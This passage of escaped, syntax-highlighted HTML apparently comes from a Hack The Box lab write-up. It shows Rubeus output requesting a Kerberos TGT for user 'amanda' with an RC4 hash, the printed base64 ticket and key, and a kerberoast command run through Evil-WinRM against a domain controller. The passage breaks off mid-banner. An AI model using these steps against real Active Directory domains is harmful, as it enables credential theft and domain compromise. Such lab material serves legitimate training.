-  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/___&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;____&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;____&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;____&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_____&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;____&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2.2.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Action:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Ask&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TGT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc4_hmac&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hash:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;7D0516EA4B6ED084F3FDF71C47D9BEB3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Building&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AS-REQ&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w/&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preauth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;htb.local\amanda&apos;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;controller:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fe80::b959:fea9:f96:ea91&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;4:88&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TGT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;successful&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ticket.kirbi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;doIEvDCCBLigAwIBBaEDAgEWooID3DCCA9hhggPUMIID0KADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4IDmjCCA5agAwIBEqEDAgECooIDiASCA4S&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NG5Blrr50jRk&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xLsJ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;3iciq4yURsyvBTTqe/O6bE8EnRjPrn7pb18n4nOF96UhFYP4wIV0i2ztt822i/nZ6BoQx3n3eix&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YlvwVvBaXueKPReC2zVay3RCGOmdUZYzXWpulPPAjl7jKh35sKIo7CvYcNaWidkz8m/kgqx3rxS/ABdE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;zuYJAEAE3DPMJffl0/pAzKubuUlqmiNVjsp1OTk2gqgV0vVviBNfxPip1aJWaBi0sMjtqMbUyaV4zBvK&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JWutdfM3r3WqiK439QtYrLFjmCBCtPkkgSmdyas6ens5b6pdZWJcTuXME0P4oYiyMWL4a1yte0AEkyoD&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;gg1g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fjVT25ONYKgJ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d46yuFY5rj2N6b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IRwRlLgVbUdfbAwLjYR4lbg1czkTZbho0HUdEIKhkr37b2y&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DAD7Q1NNxLHm0CtFJHZOcs3VpP4/5oOFFT5WLh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ZpsTX2RxCOy1KnIxx3jgTVtS1ltX2RjhFs301OGR&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nmYO6mKOxasgmQPucEF1JUUWvQ5bRrbbrXqwzMj74OXBrmSTRvcKzik5ePF0/Z4MTjhZxlJnwYegWgHm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RTdYYt3NzWfPJYa927qMKWoaEhq6Y9gr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;zCDSr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HSm1EbhUsYl2rCVVkQwrv/B9gaZahwyT2hbBUp95&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wADQlgp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Ah2Ii6vufDwi4obUA60szbPQan1e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FLp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GgGEeTDsTGHSSJYgqfzG5FMf0nKoiHe1bJB2tWl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fRmlCWgREqSRu3v8riuo5tAl4QqSPuCGnWUJzinAzdarO2Qs42oJ7FigSxaoNhCnF5iFmkF/Ao3K/D16&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;duAMbifstwHuuPfzNpggnA0D64eE0Li&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LaMJ9hgrhO6U&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;B2/6AkZ/oZhBeZtK1q2Wgx4ULV8enQRSOqW&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HWKEUT50XC82i41x6fpdxF0sIIizws0ZrQ5ZExWRDbmR4vzM4CLo1QtfnAiZj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bkjQpaLYSU/OTMeb8Q&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KWKWodIWsE2PJecM8Jw6Y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bGw34bRmdttkOVhbqK6eLzCDHa1uiub6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p2uAsHo0yUstNG711&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;3jlc3VE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SDEjWk/9zZq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;3Lz6ShKUtLBhWUvPwdknzRjkAk4Ajwv1CWitXLOcDO4B8OjPm/8DOKvwWaD7XW4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;9Kf/&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APmkvCDotBB1jKZuoBvgbSCzRnO7cPbx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pGyvpqhIeVac6/f91tTVMccblQvLqaQ1sKjgcswgcigAwIB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AKKBwASBvX2BujCBt6CBtDCBsTCBrqAbMBmgAwIBF6ESBBCp0X4zsPstFRVskdHTJWoMoQsbCUhUQi5M&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;T0NBTKITMBGgAwIBAaEKMAgbBmFtYW5kYaMHAwUAQOEAAKURGA8yMDI2MDYxODAwMDMzOVqmERgPMjAy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NjA2MTgxMDAzMzlapxEYDzIwMjYwNjI1MDAwMzM5WqgLGwlIVEIuTE9DQUypHjAcoAMCAQKhFTATGwZr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmJ0Z3QbCWh0Yi5sb2NhbA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ticket&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;written&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;amanda.kirbi&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServiceName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;krbtgt/htb.local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServiceRealm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HTB.LOCAL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;amanda&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserRealm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HTB.LOCAL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartTime&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;6/17/2026&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;8:03:39&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EndTime&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;6/18/2026&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;6:03:39&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RenewTill&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;6/24/2026&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;8:03:39&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name_canonicalize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pre_authent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;renewable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forwardable&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rc4_hmac&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;qdF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;M7D7LRUVbJHR0yVqDA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASREP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;7D0516EA4B6ED084F3FDF71C47D9BEB3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\Temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\Rubeus.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kerberoast&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/domain:htb.local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/dc:10.129.23.236&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/ticket:amanda.kirbi&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/nowrap&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/outfile:hashes.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;______&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_____&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_____&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_____&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
